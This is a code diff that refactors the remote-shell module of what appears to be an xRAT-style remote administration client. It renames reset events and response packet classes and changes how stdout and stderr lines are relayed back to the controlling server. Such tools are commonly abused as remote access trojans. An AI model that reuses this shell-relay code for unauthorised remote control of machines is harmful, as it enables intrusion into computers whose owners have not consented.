@@ -14,8 +14,7 @@ namespace xClient.Core.RemoteShell
         // error output stream from the shell (after we are done reading the standard
         // output). Reading the standard output and the standard error output at the
         // same time will cause a deadlock.
-        private ManualResetEvent _redirectOutputEvent;
-
+        private ManualResetEvent _redirectStandardOutputEvent;
         private ManualResetEvent _redirectStandardErrorEvent;
 
         private void CreateSession()
@@ -42,7 +41,7 @@ namespace xClient.Core.RemoteShell
 
             Thread.Sleep(100);
 
-            new Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(
+            new Packets.ClientPackets.DoShellExecuteResponse(">> New Session created" + Environment.NewLine).Execute(
                 Program.ConnectClient);
         }
 
@@ -51,10 +50,10 @@ namespace xClient.Core.RemoteShell
         /// </summary>
         private void InitializeResetEvents()
         {
-            if (_redirectOutputEvent != null)
-                _redirectOutputEvent.Close();
+            if (_redirectStandardOutputEvent != null)
+                _redirectStandardOutputEvent.Close();
             
-            _redirectOutputEvent = new ManualResetEvent(false);
+            _redirectStandardOutputEvent = new ManualResetEvent(false);
 
             if (_redirectStandardErrorEvent != null)
                 _redirectStandardErrorEvent.Close();
@@ -79,22 +78,20 @@ namespace xClient.Core.RemoteShell
                     while (!reader.EndOfStream && _read)
                     {
                         if (_redirectStandardErrorEvent == null)
-                            // Break out completely if the second part of our chain won't work...
                             return;
 
                         // If we are reading the standard error output, just wait.
                         _redirectStandardErrorEvent.WaitOne();
-                        _redirectOutputEvent.Set();
+                        _redirectStandardOutputEvent.Set();
 
                         var read = reader.ReadLine();
                         if (!string.IsNullOrEmpty(read))
                         {
-                            Thread.Sleep(200);
-                            new Packets.ClientPackets.ShellCommandResponse(read + Environment.NewLine).Execute(
+                            new Packets.ClientPackets.DoShellExecuteResponse(read + Environment.NewLine).Execute(
                                 Program.ConnectClient);
                         }
 
-                        _redirectOutputEvent.Reset();
+                        _redirectStandardOutputEvent.Reset();
                     }
                 }
 
@@ -109,7 +106,7 @@ namespace xClient.Core.RemoteShell
             {
                 if (ex is ApplicationException || ex is InvalidOperationException)
                 {
-                    new Packets.ClientPackets.ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
+                    new Packets.ClientPackets.DoShellExecuteResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
                         .Execute(Program.ConnectClient);
 
                     CreateSession();
@@ -125,23 +122,20 @@ namespace xClient.Core.RemoteShell
                 {
                     while (!reader.EndOfStream && _read)
                     {
-                        // Wait for your turn! ;)
-                        if (_redirectOutputEvent == null)
-                            // Break out completely if the first part of our chain doesn't work...
+                        if (_redirectStandardErrorEvent == null)
                             return;
 
-                        _redirectOutputEvent.WaitOne();
-                        _redirectStandardErrorEvent.Set();
+                        _redirectStandardOutputEvent.WaitOne();
+                        _redirectStandardErrorEvent.Reset();
 
                         var read = reader.ReadLine();
                         if (!string.IsNullOrEmpty(read))
                         {
-                            Thread.Sleep(200);
-                            new Packets.ClientPackets.ShellCommandResponse(read + Environment.NewLine, true).Execute(
+                            new Packets.ClientPackets.DoShellExecuteResponse(read + Environment.NewLine, true).Execute(
                                 Program.ConnectClient);
                         }
 
-                        _redirectStandardErrorEvent.Reset();
+                        _redirectStandardErrorEvent.Set();
                     }
                 }
 
@@ -156,7 +150,7 @@ namespace xClient.Core.RemoteShell
             {
                 if (ex is ApplicationException || ex is InvalidOperationException)
                 {
-                    new Packets.ClientPackets.ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
+                    new Packets.ClientPackets.DoShellExecuteResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
                         .Execute(Program.ConnectClient);
 
                     CreateSession();
@@ -216,9 +210,9 @@ namespace xClient.Core.RemoteShell
                 { }
                 finally
                 {
-                    if (_redirectOutputEvent != null)
+                    if (_redirectStandardOutputEvent != null)
                     {
-                        _redirectOutputEvent.Close();
+                        _redirectStandardOutputEvent.Close();
                     }
                     if (_redirectStandardErrorEvent != null)
                     {
